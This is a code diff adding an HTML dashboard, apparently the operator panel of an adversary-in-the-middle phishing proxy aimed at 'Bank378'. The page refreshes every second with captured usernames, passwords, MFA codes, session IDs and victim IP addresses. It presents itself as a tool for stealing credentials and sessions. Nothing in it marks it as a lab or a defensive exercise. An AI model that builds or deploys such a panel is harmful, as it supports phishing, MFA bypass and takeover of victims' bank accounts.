@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bank378 AiTM Dashboard</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, Helvetica, sans-serif;
+            background: #0b0f14;
+            color: #e8eef5;
+        }
+        .wrap {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+        .hero {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        .title h1 {
+            margin: 0;
+            font-size: 2rem;
+        }
+        .title p {
+            margin: 6px 0 0;
+            color: #9fb0c2;
+        }
+        .status {
+            background: #121922;
+            border: 1px solid #223244;
+            border-radius: 14px;
+            padding: 14px 18px;
+            min-width: 230px;
+        }
+        .pill {
+            display: inline-block;
+            padding: 6px 10px;
+            border-radius: 999px;
+            font-size: 0.85rem;
+            font-weight: bold;
+            background: #3b1010;
+            color: #ff8d8d;
+            border: 1px solid #6f1e1e;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 16px;
+            margin-bottom: 20px;
+        }
+        .card {
+            background: #121922;
+            border: 1px solid #223244;
+            border-radius: 16px;
+            padding: 18px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.25);
+        }
+        .card h2 {
+            margin: 0 0 12px;
+            font-size: 1rem;
+            color: #d6e4f0;
+        }
+        .metric {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+        .muted {
+            color: #9fb0c2;
+            font-size: 0.95rem;
+        }
+        .value {
+            word-break: break-word;
+            font-family: Consolas, Monaco, monospace;
+            background: #0c1219;
+            border: 1px solid #1f2c3a;
+            padding: 10px;
+            border-radius: 10px;
+        }
+        .feed {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            max-height: 460px;
+            overflow-y: auto;
+        }
+        .event {
+            background: #0c1219;
+            border: 1px solid #1f2c3a;
+            border-left: 4px solid #8b0000;
+            border-radius: 12px;
+            padding: 14px;
+        }
+        .event-head {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 8px;
+        }
+        .badge {
+            font-size: 0.78rem;
+            font-weight: bold;
+            padding: 4px 8px;
+            border-radius: 999px;
+            text-transform: uppercase;
+            letter-spacing: 0.03em;
+        }
+        .badge.credentials { background: #2f1f07; color: #ffd27d; }
+        .badge.mfa { background: #1b2140; color: #95a8ff; }
+        .badge.session { background: #183320; color: #8ee6aa; }
+        .badge.request { background: #2c2c2c; color: #d1d1d1; }
+        .kv {
+            margin: 4px 0;
+            color: #d7e2ec;
+        }
+        .small {
+            color: #93a4b6;
+            font-size: 0.88rem;
+        }
+        .empty {
+            padding: 28px;
+            text-align: center;
+            color: #9fb0c2;
+            border: 1px dashed #304458;
+            border-radius: 14px;
+            background: #0c1219;
+        }
+        a {
+            color: #8dc7ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="wrap">
+        <div class="hero">
+            <div class="title">
+                <h1>Bank378 AiTM Dashboard</h1>
+                <p>Captures credentials, MFA codes, and stolen sessions.</p>
+            </div>
+                <div class="pill">Proxy Active (1s)</div>
+        </div>
+
+
+        <div class="grid">
+            <div class="card">
+                <h2>Total Captured Events</h2>
+                <div class="metric" id="total-events">0</div>
+            </div>
+            <div class="card">
+                <h2>Latest Credentials</h2>
+                <div class="value" id="latest-credentials">None</div>
+            </div>
+            <div class="card">
+                <h2>Latest MFA Code</h2>
+                <div class="value" id="latest-mfa">None</div>
+            </div>
+            <div class="card">
+                <h2>Latest Session ID</h2>
+                <div class="value" id="latest-session">None</div>
+            </div>
+        </div>
+
+
+        <div class="card">
+            <h2>Live Activity Feed</h2>
+            <div id="feed" class="feed"></div>
+        </div>
+    </div>
+
+
+    <script>
+        function escapeHtml(value) {
+            return String(value)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
+
+        function renderEvent(event) {
+            const detailLines = [];
+            if (event.username !== undefined) detailLines.push(`<div class="kv"><strong>User:</strong> ${escapeHtml(event.username)}</div>`);
+            if (event.password !== undefined) detailLines.push(`<div class="kv"><strong>Password:</strong> ${escapeHtml(event.password)}</div>`);
+            if (event.code !== undefined) detailLines.push(`<div class="kv"><strong>Code:</strong> ${escapeHtml(event.code)}</div>`);
+            if (event.session_id !== undefined) detailLines.push(`<div class="kv"><strong>Session ID:</strong> ${escapeHtml(event.session_id)}</div>`);
+            if (event.path !== undefined) detailLines.push(`<div class="kv"><strong>Path:</strong> ${escapeHtml(event.path)}</div>`);
+            if (event.ip !== undefined) detailLines.push(`<div class="kv"><strong>Victim IP:</strong> ${escapeHtml(event.ip)}</div>`);
+            if (event.note !== undefined) detailLines.push(`<div class="kv"><strong>Note:</strong> ${escapeHtml(event.note)}</div>`);
+
+
+            return `
+                <div class="event">
+                    <div class="event-head">
+                        <span class="badge ${escapeHtml(event.type)}">${escapeHtml(event.type)}</span>
+                        <span class="small">${escapeHtml(event.timestamp)}</span>
+                    </div>
+                    ${detailLines.join('')}
+                </div>
+            `;
+        }
+
+
+        function renderLatest(selector, text) {
+            document.querySelector(selector).textContent = text || 'None';
+        }
+
+
+        async function refreshDashboard() {
+            try {
+                const response = await fetch('/api/events');
+                const data = await response.json();
+
+
+                document.getElementById('total-events').textContent = data.total_events;
+                renderLatest('#latest-credentials', data.latest_credentials ? `${data.latest_credentials.username} / ${data.latest_credentials.password}` : 'None');
+                renderLatest('#latest-mfa', data.latest_mfa ? data.latest_mfa.code : 'None');
+                renderLatest('#latest-session', data.latest_session ? data.latest_session.session_id : 'None');
+
+
+                const feed = document.getElementById('feed');
+                if (!data.events.length) {
+                    feed.innerHTML = '<div class="empty">No activity.</div>';
+                    return;
+                }
+
+
+                feed.innerHTML = data.events.map(renderEvent).join('');
+            } catch (error) {
+                document.getElementById('feed').innerHTML = '<div class="empty">Dashboard failed to update. Check that the proxy is still running.</div>';
+            }
+        }
+
+
+        refreshDashboard();
+        setInterval(refreshDashboard, 1000);
+    </script>
+</body>
+</html>
